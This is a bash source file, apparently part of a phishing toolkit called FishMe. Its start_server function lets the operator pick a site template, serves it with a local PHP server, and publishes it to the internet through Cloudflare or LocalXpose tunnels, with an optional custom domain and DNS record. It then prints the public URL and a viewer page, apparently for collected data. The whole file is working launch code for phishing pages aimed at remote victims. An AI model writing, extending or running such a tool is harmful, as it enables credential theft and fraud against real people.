start_server() {
    check_php
    clear
    echo -e "${CYAN}"
    echo -e "  ▄████████  ▄█     ▄████████    ▄█    █▄      ▄▄▄▄███▄▄▄▄      ▄████████ "
    echo -e "  ███    ███ ███    ███    ███   ███    ███   ▄██▀▀▀███▀▀▀██▄   ███    ███ "
    echo -e "  ███    █▀  ███▌   ███    █▀    ███    ███   ███   ███   ███   ███    █▀  "
    echo -e " ▄███▄▄▄     ███▌   ███         ▄███▄▄▄▄███▄▄ ███   ███   ███  ▄███▄▄▄     "
    echo -e "▀▀███▀▀▀     ███▌ ▀███████████ ▀▀███▀▀▀▀███▀  ███   ███   ███ ▀▀███▀▀▀     "
    echo -e "  ███        ███           ███   ███    ███   ███   ███   ███   ███    █▄  "
    echo -e "  ███        ███     ▄█    ███   ███    ███   ███   ███   ███   ███    ███ "
    echo -e "  ███        █▀    ▄████████▀    ███    █▀     ▀█   ███   █▀    ██████████ "
    echo
    echo -e "${CYAN}=============================================================${RESET}"
    echo -e "    ${WHITE} v${__version__}${RESET}"
    echo -e "${CYAN}=============================================================${RESET}"
    echo -e "  ${DIM}Select a site template to launch${RESET}"
    echo -e "${CYAN}=============================================================${RESET}"
    echo

    SITES=()
    if [[ -d "${SITES_ROOT}" ]]; then
        for d in "${SITES_ROOT}"/*/; do
            [[ -f "${d}index.php" ]] && SITES+=("$(basename "$d")")
        done
    fi

    if [[ ${#SITES[@]} -eq 0 ]]; then
        echo -e "${RED}[!]${RESET} No sites found in ${SITES_ROOT}"
        exit 1
    fi

    cols=3
    i=1
    for s in "${SITES[@]}"; do
        printf " ${GREEN}%-3s${RESET} %-20s" "[$i]" "$s"
        if (( i % cols == 0 )); then echo; fi
        ((i++))
    done
    if (( (i-1) % cols != 0 )); then echo; fi

    echo
    echo -e "${CYAN}=============================================================${RESET}"
    read -p "  ${CYAN}[?]${RESET} Enter option number: " opt

    if [[ "${opt}" =~ ^[0-9]+$ && ${opt} -ge 1 && ${opt} -le ${#SITES[@]} ]]; then
        SITE_NAME="${SITES[$((opt-1))]}"
        
        # Clear any previous sub-template selection
        unset SELECTED_SUB_TEMPLATE
        unset SUB_TEMPLATE_SELECTION_IN_PROGRESS
        unset FINAL_SITE_NAME
        
        # Check for sub-templates and show selection if multiple exist
        local sub_template
        sub_template=$(select_sub_template "$SITE_NAME")
        
        if [[ "$sub_template" != "main" ]]; then
            SITE_NAME="${SITE_NAME}/${sub_template}"
            echo -e "${GREEN}[+]${RESET} Selected: ${BOLD}${SITE_NAME}${RESET}"
        else
            echo -e "${GREEN}[+]${RESET} Selected: ${BOLD}${SITE_NAME}${RESET}"
        fi
        
        # Export the final SITE_NAME to prevent re-selection
        export FINAL_SITE_NAME="$SITE_NAME"
        export SUB_TEMPLATE_SELECTION_COMPLETE="1"
    else
        echo -e "${RED}[!]${RESET} Invalid option. Exiting."
        exit 1
    fi

    echo
    read -n1 -p "${CYAN}[?]${RESET} Use custom port? [y/N]: " ans
    echo
    if [[ ${ans,,} == "y" ]]; then
        read -p "${CYAN}[-]${RESET} Enter port [1024-9999]: " cu_p
        if [[ "${cu_p}" =~ ^([1-9][0-9][0-9][0-9])$ ]] && [[ ${cu_p} -ge 1024 ]]; then PORT=${cu_p}; fi
    fi

    echo
    read -n1 -p "${CYAN}[?]${RESET} Use public tunnel for remote URL? [y/N]: " tunnel_ans
    echo

    TUNNEL_PID=""
    TUNNEL_URL=""
    TUNNEL_TYPE=""
    SELECTED_DOMAIN=""
    if [[ ${tunnel_ans,,} == "y" ]]; then
        echo
        echo -e "  ${CYAN}[1]${RESET} Cloudflare  ${DIM}(free, no account)${RESET}"
        echo -e "  ${CYAN}[2]${RESET} Cloudflare with account  ${DIM}(use your own domain)${RESET}"
        echo -e "  ${CYAN}[3]${RESET} LocalXpose  ${DIM}(requires loclx account)${RESET}"
        read -p "  ${CYAN}[?]${RESET} Select tunnel [1/2/3]: " tunnel_opt
        echo

        case "$tunnel_opt" in
            1)
                if ! check_cloudflared; then
                    echo -e "  ${ORANGE}[!]${RESET} cloudflared not found."
                    read -n1 -p "  ${CYAN}[?]${RESET} Install it now? [y/N]: " inst_ans
                    echo
                    if [[ ${inst_ans,,} == "y" ]]; then
                        install_cloudflared || { echo -e "  ${RED}[!]${RESET} Skipping Cloudflare tunnel."; }
                    fi
                fi
                if check_cloudflared; then
                    TUNNEL_TYPE="cloudflare"
                fi
                ;;
            2)
                if ! check_cloudflared; then
                    echo -e "  ${ORANGE}[!]${RESET} cloudflared not found."
                    read -n1 -p "  ${CYAN}[?]${RESET} Install it now? [y/N]: " inst_ans
                    echo
                    if [[ ${inst_ans,,} == "y" ]]; then
                        install_cloudflared || { echo -e "  ${RED}[!]${RESET} Skipping Cloudflare tunnel."; }
                    fi
                fi
                if check_cloudflared; then
                    # Check if logged in
                    if [[ ! -f "${BASE_DIR}/.cf_token" ]]; then
                        echo -e "  ${ORANGE}[!]${RESET} Not logged in to Cloudflare."
                        read -n1 -p "  ${CYAN}[?]${RESET} Login now? [y/N]: " login_ans
                        echo
                        if [[ ${login_ans,,} == "y" ]]; then
                            cloudflare_login || { echo -e "  ${RED}[!]${RESET} Skipping Cloudflare tunnel."; }
                        fi
                    fi
                    if [[ -f "${BASE_DIR}/.cf_token" ]]; then
                        # Select domain
                        if cloudflare_select_domain; then
                            TUNNEL_TYPE="cloudflare_account"
                        else
                            echo -e "  ${RED}[!]${RESET} Domain selection failed. Skipping tunnel."
                        fi
                    else
                        echo -e "  ${RED}[!]${RESET} Skipping Cloudflare tunnel (not logged in)."
                    fi
                fi
                ;;
            3)
                if ! check_loclx; then
                    echo -e "  ${ORANGE}[!]${RESET} loclx not found."
                    read -n1 -p "  ${CYAN}[?]${RESET} Install it now? [y/N]: " inst_ans
                    echo
                    if [[ ${inst_ans,,} == "y" ]]; then
                        install_loclx || { echo -e "  ${RED}[!]${RESET} Skipping LocalXpose tunnel."; }
                    fi
                fi
                if check_loclx; then
                    local lx_bin
                    lx_bin=$(command -v loclx 2>/dev/null || echo "${BASE_DIR}/loclx")
                    if ! check_loclx_auth "$lx_bin"; then
                        echo -e "  ${ORANGE}[!]${RESET} LocalXpose is not authenticated."
                        echo -e "  ${DIM}    Get your access token at: https://localxpose.io/dashboard/access${RESET}"
                        read -n1 -p "  ${CYAN}[?]${RESET} Login now? [y/N]: " login_ans
                        echo
                        if [[ ${login_ans,,} == "y" ]]; then
                            "$lx_bin" account login || echo -e "  ${RED}[!]${RESET} Login failed."
                        fi
                    fi
                    if check_loclx_auth "$lx_bin"; then
                        TUNNEL_TYPE="localxpose"
                    else
                        echo -e "  ${RED}[!]${RESET} Skipping LocalXpose tunnel (not authenticated)."
                    fi
                fi
                ;;
            *)
                echo -e "  ${RED}[!]${RESET} Invalid tunnel option. Continuing without tunnel."
                ;;
        esac
    fi

    local allocated_path
    allocated_path=$(get_site_allocated_url "$SITE_NAME")
    cd "${BASE_DIR}" || exit 1
    FISHME_ACTIVE_SITE="${SITE_NAME}" php -S "${HOST}:${PORT}" "${BASE_DIR}/router.php" >/dev/null 2>&1 &
    PHP_PID=$!

    if [[ "$TUNNEL_TYPE" == "cloudflare" ]]; then
        echo -e "${CYAN}[~]${RESET} Starting Cloudflare tunnel..."
        local cf_log cf_bin
        cf_log=$(mktemp)
        cf_bin=$(command -v cloudflared 2>/dev/null || echo "${BASE_DIR}/cloudflared")

        "$cf_bin" tunnel --url "http://${HOST}:${PORT}" --logfile "$cf_log" >/dev/null 2>&1 &
        TUNNEL_PID=$!

        local attempts=0
        while [[ $attempts -lt 30 ]]; do
            TUNNEL_URL=$(grep -oP 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' "$cf_log" 2>/dev/null | head -1)
            [[ -n "$TUNNEL_URL" ]] && break
            sleep 0.5
            ((attempts++))
        done

        if [[ -n "$TUNNEL_URL" ]]; then
            show_tunnel_urls "CLOUDFLARE" "$TUNNEL_URL"
        else
            echo -e "  ${RED}[!]${RESET} Could not get Cloudflare tunnel URL. Check network and try again."
            echo -e "\n${GREEN}[+]${RESET} Starting FishMe server..."
            echo -e "${CYAN}[-]${RESET} Site    : ${BOLD}${SITE_NAME}${RESET}"
            echo -e "${CYAN}[-]${RESET} Main URL: ${BOLD}http://${HOST}:${PORT}/${allocated_path}/${RESET}"
            echo -e "${CYAN}[-]${RESET} Local   : ${BOLD}http://${HOST}:${PORT}/templates/${SITE_NAME}/${RESET}"
            echo -e "${CYAN}[-]${RESET} Viewer  : ${BOLD}http://${HOST}:${PORT}/viewer.php${RESET}"
        fi
    elif [[ "$TUNNEL_TYPE" == "cloudflare_account" ]]; then
        echo -e "${CYAN}[~]${RESET} Setting up Cloudflare tunnel on ${BOLD}${SELECTED_DOMAIN}${RESET}..."
        
        # Get account ID
        local account_id
        account_id=$(cloudflare_get_account_id)
        if [[ $? -ne 0 ]]; then
            echo -e "  ${RED}[!]${RESET} Failed to get Cloudflare account ID."
            echo -e "\n${GREEN}[+]${RESET} Starting FishMe server..."
            echo -e "${CYAN}[-]${RESET} Site    : ${BOLD}${SITE_NAME}${RESET}"
            echo -e "${CYAN}[-]${RESET} Main URL: ${BOLD}http://${HOST}:${PORT}/${allocated_path}/${RESET}"
            echo -e "${CYAN}[-]${RESET} Local   : ${BOLD}http://${HOST}:${PORT}/templates/${SITE_NAME}/${RESET}"
            echo -e "${CYAN}[-]${RESET} Viewer  : ${BOLD}http://${HOST}:${PORT}/viewer.php${RESET}"
        else
            # Create tunnel
            local tunnel_id
            tunnel_id=$(cloudflare_create_tunnel "$account_id" "$SITE_NAME")
            if [[ $? -ne 0 ]]; then
                echo -e "  ${RED}[!]${RESET} Failed to create Cloudflare tunnel."
                echo -e "\n${GREEN}[+]${RESET} Starting FishMe server..."
                echo -e "${CYAN}[-]${RESET} Site    : ${BOLD}${SITE_NAME}${RESET}"
                echo -e "${CYAN}[-]${RESET} Main URL: ${BOLD}http://${HOST}:${PORT}/${allocated_path}/${RESET}"
                echo -e "${CYAN}[-]${RESET} Local   : ${BOLD}http://${HOST}:${PORT}/templates/${SITE_NAME}/${RESET}"
                echo -e "${CYAN}[-]${RESET} Viewer  : ${BOLD}http://${HOST}:${PORT}/viewer.php${RESET}"
            else
                # Create DNS record
                if cloudflare_create_dns_record "$SELECTED_ZONE_ID" "$SELECTED_DOMAIN" "$tunnel_id"; then
                    echo -e "  ${GREEN}[+]${RESET} DNS record created for ${BOLD}${SELECTED_DOMAIN}${RESET}"
                    local tunnel_token
                    tunnel_token=$(cloudflare_get_tunnel_token "$account_id" "$tunnel_id")
                    if [[ $? -ne 0 ]]; then
                        echo -e "  ${RED}[!]${RESET} Failed to get tunnel token."
                        echo -e "\n${GREEN}[+]${RESET} Starting FishMe server..."
                        echo -e "${CYAN}[-]${RESET} Site    : ${BOLD}${SITE_NAME}${RESET}"
                        echo -e "${CYAN}[-]${RESET} Main URL: ${BOLD}http://${HOST}:${PORT}/${allocated_path}/${RESET}"
                        echo -e "${CYAN}[-]${RESET} Local   : ${BOLD}http://${HOST}:${PORT}/templates/${SITE_NAME}/${RESET}"
                        echo -e "${CYAN}[-]${RESET} Viewer  : ${BOLD}http://${HOST}:${PORT}/viewer.php${RESET}"
                    else
                        # Start cloudflared with tunnel token
                        local cf_bin
                        cf_bin=$(command -v cloudflared 2>/dev/null || echo "${BASE_DIR}/cloudflared")
                        "$cf_bin" tunnel --token "$tunnel_token" >/dev/null 2>&1 &
                        TUNNEL_PID=$!
                        
                        TUNNEL_URL="https://${SELECTED_DOMAIN}"
                        show_tunnel_urls "CLOUDFLARE" "$TUNNEL_URL"
                    fi
                else
                    echo -e "  ${RED}[!]${RESET} Failed to create DNS record."
                    echo -e "\n${GREEN}[+]${RESET} Starting FishMe server..."
                    echo -e "${CYAN}[-]${RESET} Site    : ${BOLD}${SITE_NAME}${RESET}"
                    echo -e "${CYAN}[-]${RESET} Main URL: ${BOLD}http://${HOST}:${PORT}/${allocated_path}/${RESET}"
                    echo -e "${CYAN}[-]${RESET} Local   : ${BOLD}http://${HOST}:${PORT}/templates/${SITE_NAME}/${RESET}"
                    echo -e "${CYAN}[-]${RESET} Viewer  : ${BOLD}http://${HOST}:${PORT}/viewer.php${RESET}"
                fi
            fi
        fi
    elif [[ "$TUNNEL_TYPE" == "localxpose" ]]; then
        echo -e "${CYAN}[~]${RESET} Starting LocalXpose tunnel..."
        local lx_log lx_bin
        lx_log=$(mktemp)
        lx_bin=$(command -v loclx 2>/dev/null || echo "${BASE_DIR}/loclx")

        "$lx_bin" tunnel --raw-mode http --https-redirect -t "${HOST}:${PORT}" >"$lx_log" 2>&1 &
        TUNNEL_PID=$!

        local attempts=0
        while [[ $attempts -lt 30 ]]; do
            TUNNEL_URL=$(grep -oP 'https://[-0-9a-z.]+\.loclx\.io' "$lx_log" 2>/dev/null | head -1)
            [[ -n "$TUNNEL_URL" ]] && break
            sleep 0.5
            ((attempts++))
        done

        if [[ -n "$TUNNEL_URL" ]]; then
            show_tunnel_urls "LOCALXPOSE" "$TUNNEL_URL"
        else
            echo -e "  ${RED}[!]${RESET} Could not get LocalXpose tunnel URL. Check network/auth and try again."
            echo -e "\n${GREEN}[+]${RESET} Starting FishMe server..."
            echo -e "${CYAN}[-]${RESET} Site    : ${BOLD}${SITE_NAME}${RESET}"
            echo -e "${CYAN}[-]${RESET} Main URL: ${BOLD}http://${HOST}:${PORT}/${allocated_path}/${RESET}"
            echo -e "${CYAN}[-]${RESET} Local   : ${BOLD}http://${HOST}:${PORT}/templates/${SITE_NAME}/${RESET}"
            echo -e "${CYAN}[-]${RESET} Viewer  : ${BOLD}http://${HOST}:${PORT}/viewer.php${RESET}"
        fi
    else
        echo -e "\n${GREEN}[+]${RESET} Starting FishMe server..."
        echo -e "${CYAN}[-]${RESET} Site    : ${BOLD}${SITE_NAME}${RESET}"
        echo -e "${CYAN}[-]${RESET} Main URL: ${BOLD}http://${HOST}:${PORT}/${allocated_path}/${RESET}"
        echo -e "${CYAN}[-]${RESET} Local   : ${BOLD}http://${HOST}:${PORT}/templates/${SITE_NAME}/${RESET}"
        echo -e "${CYAN}[-]${RESET} Viewer  : ${BOLD}http://${HOST}:${PORT}/viewer.php${RESET}"
    fi

    echo -e "${GREEN}[+]${RESET} Press ${BOLD}Ctrl+C${RESET} to stop."
    echo

    cleanup() {
        echo -e "\n${CYAN}[~]${RESET} Shutting down..."
        [[ -n "$PHP_PID" ]] && kill "$PHP_PID" 2>/dev/null
        [[ -n "$TUNNEL_PID" ]] && kill "$TUNNEL_PID" 2>/dev/null
        rm -f "${BASE_DIR}/.tunnel_token" 2>/dev/null
        echo -e "${GREEN}[+]${RESET} Done."
        exit 0
    }
    trap cleanup SIGINT SIGTERM

    wait "$PHP_PID"
}

